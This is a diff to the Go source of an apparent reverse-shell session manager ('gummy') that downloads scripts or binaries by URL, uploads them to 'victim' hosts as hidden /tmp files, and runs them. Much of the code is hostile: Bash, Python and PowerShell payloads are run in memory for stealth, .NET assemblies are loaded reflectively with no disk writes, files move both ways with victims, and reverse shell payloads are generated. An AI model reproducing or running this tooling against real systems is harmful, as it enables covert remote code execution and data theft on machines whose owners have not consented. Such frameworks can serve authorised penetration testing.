@@ -91,14 +91,14 @@ func sanitizePath(s string) string {
 
 // RunScript downloads (if URL), uploads to victim, executes, streams output
 // Simple approach that actually works with clean output
-func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
+func (s *SessionInfo) RunScript(ctx context.Context, scriptSource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
 		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -113,7 +113,14 @@ func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
+	// Upload script
+	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
+		return fmt.Errorf("upload failed: %w", err)
+	}
+
+	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -121,13 +128,6 @@ func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	// Upload script
-	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
-		return fmt.Errorf("upload failed: %w", err)
-	}
 
 	// Build args
 	argsStr := ""
@@ -159,14 +159,14 @@ func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
 // This avoids writing script to disk on victim (more stealthy)
 // scriptSource: URL or local path to script file
 // args: arguments to pass to the script
-func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) error {
+func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
 		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -181,15 +181,6 @@ func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) erro
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
-	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
-
-	if err := OpenTerminal(tailCmd); err != nil {
-		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
-	}
-
-	time.Sleep(300 * time.Millisecond)
-
 	// Generate unique variable name
 	varName := fmt.Sprintf("_gummy_script_%d", time.Now().UnixNano())
 
@@ -198,6 +189,15 @@ func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) erro
 	if err := t.UploadToBashVariable(context.Background(), scriptPath, varName); err != nil {
 		return fmt.Errorf("upload to memory failed: %w", err)
 	}
+
+	// Open terminal after upload completes
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
 
 	// Build args
 	argsStr := ""
@@ -229,14 +229,14 @@ func (s *SessionInfo) RunScriptInMemory(scriptSource string, args []string) erro
 
 // RunBinary downloads (if URL), uploads to victim, makes executable, runs
 // Same as RunScript but for binary executables (no bash interpreter)
-func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
+func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var binaryPath string
 	if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
 		binaryPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(binarySource))
-		if err := DownloadFile(binarySource, binaryPath); err != nil {
+		if err := DownloadFile(ctx, binarySource, binaryPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -251,7 +251,14 @@ func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
+	// Upload binary
+	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.Upload(context.Background(), binaryPath, remotePath); err != nil {
+		return fmt.Errorf("upload failed: %w", err)
+	}
+
+	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -259,13 +266,6 @@ func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	// Upload binary
-	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.Upload(context.Background(), binaryPath, remotePath); err != nil {
-		return fmt.Errorf("upload failed: %w", err)
-	}
 
 	// Build args
 	argsStr := ""
@@ -306,14 +306,14 @@ func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
 
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
 // Similar to RunScriptInMemory but for PowerShell on Windows
-func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) error {
+func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
 		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -328,7 +328,17 @@ func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) 
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
+	// Generate unique variable name
+	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())
+
+	// Upload script to PowerShell variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	if err := t.UploadToPowerShellVariable(ctx, scriptPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -336,15 +346,6 @@ func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) 
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	// Generate unique variable name
-	varName := fmt.Sprintf("gummy_ps_%d", time.Now().UnixNano())
-
-	// Upload script to PowerShell variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.UploadToPowerShellVariable(context.Background(), scriptPath, varName); err != nil {
-		return fmt.Errorf("upload to memory failed: %w", err)
-	}
 
 	// Build args (PowerShell style)
 	argsStr := ""
@@ -378,14 +379,14 @@ func (s *SessionInfo) RunPowerShellInMemory(scriptSource string, args []string) 
 
 // RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
 // Uses reflection to load and execute assembly from memory
-func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) error {
+func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var assemblyPath string
 	if strings.HasPrefix(assemblySource, "http://") || strings.HasPrefix(assemblySource, "https://") {
 		assemblyPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(assemblySource))
-		if err := DownloadFile(assemblySource, assemblyPath); err != nil {
+		if err := DownloadFile(ctx, assemblySource, assemblyPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -400,7 +401,17 @@ func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) er
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
+	// Generate unique variable name
+	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())
+
+	// Upload assembly to PowerShell variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	if err := t.UploadToPowerShellVariable(ctx, assemblyPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -408,15 +419,6 @@ func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) er
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	// Generate unique variable name
-	varName := fmt.Sprintf("gummy_asm_%d", time.Now().UnixNano())
-
-	// Upload assembly to PowerShell variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.UploadToPowerShellVariable(context.Background(), assemblyPath, varName); err != nil {
-		return fmt.Errorf("upload to memory failed: %w", err)
-	}
 
 	// Build args (PowerShell array syntax)
 	argsStr := ""
@@ -443,15 +445,38 @@ func (s *SessionInfo) RunDotNetInMemory(assemblySource string, args []string) er
 		// 2. Load assembly with [Reflection.Assembly]::Load()
 		// 3. Find and invoke entry point
 		cmd := fmt.Sprintf(`
-$bytes = [System.Convert]::FromBase64String($%s)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
-$entryPoint = $assembly.EntryPoint
-if ($entryPoint -ne $null) {
-    $entryPoint.Invoke($null, %s)
-} else {
-    Write-Host 'No entry point found in assembly'
+try {
+    $bytes = [System.Convert]::FromBase64String($%s)
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -ne $null) {
+        # Capture both stdout and stderr
+        $output = & {
+            $oldOut = [Console]::Out
+            $oldErr = [Console]::Error
+            $sw = New-Object System.IO.StringWriter
+            [Console]::SetOut($sw)
+            [Console]::SetError($sw)
+
+            try {
+                $params = @(,[string[]]%s)
+                $entryPoint.Invoke($null, $params) | Out-Null
+            } finally {
+                [Console]::SetOut($oldOut)
+                [Console]::SetError($oldErr)
+                $result = $sw.ToString()
+                $sw.Dispose()
+                $result
+            }
+        }
+        Write-Output $output
+    } else {
+        Write-Host 'ERROR: No entry point found in assembly'
+    }
+} catch {
+    Write-Host "ERROR: $_"
 }
-Remove-Variable -Name %s
+Remove-Variable -Name %s -ErrorAction SilentlyContinue
 `, varName, argsStr, varName)
 
 		if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
@@ -465,14 +490,14 @@ Remove-Variable -Name %s
 
 // RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
 // Similar to RunScriptInMemory but for Python
-func (s *SessionInfo) RunPythonInMemory(scriptSource string, args []string) error {
+func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string, args []string) error {
 	timestamp := time.Now().Format("2006_01_02-15_04_05")
 
 	// Download if URL
 	var scriptPath string
 	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
 		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
-		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+		if err := DownloadFile(ctx, scriptSource, scriptPath); err != nil {
 			return fmt.Errorf("download failed: %w", err)
 		}
 	} else {
@@ -487,7 +512,17 @@ func (s *SessionInfo) RunPythonInMemory(scriptSource string, args []string) erro
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Open terminal
+	// Generate unique variable name
+	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
+
+	// Upload script to Python variable (in-memory, no disk write)
+	t := NewTransferer(s.Conn, s.ID)
+	t.SetPlatform(s.Platform)
+	if err := t.UploadToPythonVariable(ctx, scriptPath, varName); err != nil {
+		return fmt.Errorf("upload to memory failed: %w", err)
+	}
+
+	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -495,15 +530,6 @@ func (s *SessionInfo) RunPythonInMemory(scriptSource string, args []string) erro
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	// Generate unique variable name
-	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
-
-	// Upload script to Python variable (in-memory, no disk write)
-	t := NewTransferer(s.Conn, s.ID)
-	if err := t.UploadToPythonVariable(context.Background(), scriptPath, varName); err != nil {
-		return fmt.Errorf("upload to memory failed: %w", err)
-	}
 
 	// Build args (Python sys.argv style)
 	argsStr := ""
@@ -844,11 +870,6 @@ func (m *Manager) RemoveSession(id string) {
 	if session.Active {
 		m.activeConn = nil
 		m.menuActive = true
-		if len(m.sessions) > 0 {
-			m.showMenu()
-		} else {
-			fmt.Println("No active sessions")
-		}
 	}
 }
 
@@ -1022,10 +1043,24 @@ func (m *Manager) handleRunModule(moduleName string, args []string) {
 		return
 	}
 
-	// Run module
+	// Create context with cancel for Ctrl+D handling
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	// Start watching for Ctrl+D in background
+	WatchForCancel(ctx, cancel)
+
+	// Show hint and run module
 	fmt.Println(ui.Info(fmt.Sprintf("Running module: %s (%s)", module.Name(), module.Category())))
-	if err := module.Run(m.selectedSession, args); err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Module failed: %v", err)))
+	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))
+
+	if err := module.Run(ctx, m.selectedSession, args); err != nil {
+		// Check if it was cancelled by user
+		if ctx.Err() == context.Canceled {
+			fmt.Println(ui.Warning("Module cancelled by user"))
+		} else {
+			fmt.Println(ui.Error(fmt.Sprintf("Module failed: %v", err)))
+		}
 		return
 	}
 }
@@ -1304,17 +1339,10 @@ func (m *Manager) monitorSession(session *SessionInfo) {
 
 		if err != nil {
 			// Conexão morta, remove a sessão
-			fmt.Printf("\r\n%s\r\n", ui.SessionClosed(session.NumID, session.RemoteIP))
+			// Nota: readline está bloqueado esperando input, então o prompt só
+			// vai aparecer quando o usuário pressionar Enter (comportamento esperado)
+			fmt.Print("\r\n") // Quebra linha antes da mensagem de "Session closed"
 			m.RemoveSession(session.ID)
-
-			// Se estava no menu, mostra novo prompt
-			if m.menuActive {
-				if m.selectedSession != nil {
-					fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
-				} else {
-					fmt.Print(ui.Prompt())
-				}
-			}
 			return
 		}
 	}
@@ -1682,26 +1710,36 @@ func (m *Manager) handleUpload(localPath, remotePath string) {
 
 	// Create transferer
 	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)
+	t.SetPlatform(m.selectedSession.Platform)
 
-	// Create context with cancel for ESC handling
+	// Create context with cancel for Ctrl+D handling
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Start watching for ESC key in background
-	go WatchForCancel(ctx, cancel)
+	// Start watching for Ctrl+D in background
+	WatchForCancel(ctx, cancel)
 
 	// Show hint
-	fmt.Println(ui.CommandHelp("Press ESC to cancel"))
+	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))
 
 	// Perform upload
 	err := t.Upload(ctx, localPath, remotePath)
 	if err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Upload failed: %v", err)))
+		// Check if it was cancelled by user
+		if ctx.Err() == context.Canceled {
+			fmt.Println(ui.Warning("Upload cancelled by user"))
+		} else {
+			fmt.Println(ui.Error(fmt.Sprintf("Upload failed: %v", err)))
+		}
 		return
 	}
 
 	// Drain any output from transfer commands
 	t.DrainOutput()
+
+	// Minimal cleanup (ESC cancel disabled for debugging)
+	time.Sleep(100 * time.Millisecond)
+	os.Stdout.Sync()
 }
 
 // handleDownload handles file download command
@@ -1714,26 +1752,36 @@ func (m *Manager) handleDownload(remotePath, localPath string) {
 
 	// Create transferer
 	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)
+	t.SetPlatform(m.selectedSession.Platform)
 
-	// Create context with cancel for ESC handling
+	// Create context with cancel for Ctrl+D handling
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Start watching for ESC key in background
-	go WatchForCancel(ctx, cancel)
+	// Start watching for Ctrl+D in background
+	WatchForCancel(ctx, cancel)
 
 	// Show hint
-	fmt.Println(ui.CommandHelp("Press ESC to cancel"))
+	fmt.Println(ui.CommandHelp("Press Ctrl+D to cancel"))
 
 	// Perform download
 	err := t.Download(ctx, remotePath, localPath)
 	if err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Download failed: %v", err)))
+		// Check if it was cancelled by user
+		if ctx.Err() == context.Canceled {
+			fmt.Println(ui.Warning("Download cancelled by user"))
+		} else {
+			fmt.Println(ui.Error(fmt.Sprintf("Download failed: %v", err)))
+		}
 		return
 	}
 
 	// Drain any output from transfer commands
 	t.DrainOutput()
+
+	// Minimal cleanup (ESC cancel disabled for debugging)
+	time.Sleep(100 * time.Millisecond)
+	os.Stdout.Sync()
 }
 
 // handleRev generates and displays reverse shell payloads
